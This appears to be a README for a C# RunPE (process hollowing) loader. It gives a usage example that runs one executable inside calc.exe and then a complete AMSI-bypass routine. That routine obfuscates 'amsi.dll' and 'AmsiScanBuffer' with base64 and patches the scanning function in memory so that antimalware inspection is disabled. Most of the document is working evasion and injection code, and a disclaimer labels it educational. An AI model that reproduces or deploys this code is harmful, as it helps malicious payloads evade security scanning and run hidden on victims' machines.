# RunPE (x86/32-bit only)
For educational purposes only. Not intented for use.

Usage: 
```c#
RunPE.Run("C:\\windows\\syswow64\\calc.exe", File.ReadAllBytes("putty.exe"));
```

For a 64-bit version see: https://github.com/gigajew/Mandark

# Problems
Sometimes the program crashes with error code 0xc0000005 and I can only assume it's because of Windows DEP. Not aware of any workarounds as of this date.

# AMSI Disable patch (by Rasta Mouse)
```c#
private static string Decode(string data)
{
	return Encoding.UTF8.GetString(Convert.FromBase64String(data));
}
public static void DisableAMSI()
{
	// credits: Rasta Mouse
	uint flOld;
	IntPtr amsilib = LoadLibrary(Decode("YW1zaS5kbGw="));//"amsi.dll");
	IntPtr proc = GetProcAddress(amsilib, Decode("QW1zaVNjYW5CdWZmZXI="));//"AmsiScanBuffer");
	byte[] _64bit = new byte[] { 0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC3 }; // "\x31\xC0\x05\x78\x01\x19\x7F\x05\xDF\xFE\xED\x00\xC3"
	byte[] _32bit = new byte[] { 0x31, 0xC0, 0x05, 0x78, 0x01, 0x19, 0x7F, 0x05, 0xDF, 0xFE, 0xED, 0x00, 0xC2, 0x18, 0x00 };
	if (IntPtr.Size * 8 == 64)
	{
		ReplaceCode(proc, _64bit);
	}
	else
	{
		ReplaceCode(proc, _32bit);
	}
}

private static void ReplaceCode(IntPtr location, byte[] newData)
{
	uint flOld;
	VirtualProtect(location, (uint)newData.Length, 0x40, out flOld);
	Marshal.Copy(newData, 0, location, newData.Length);
	VirtualProtect(location, (uint)newData.Length, flOld, out flOld);
}
```
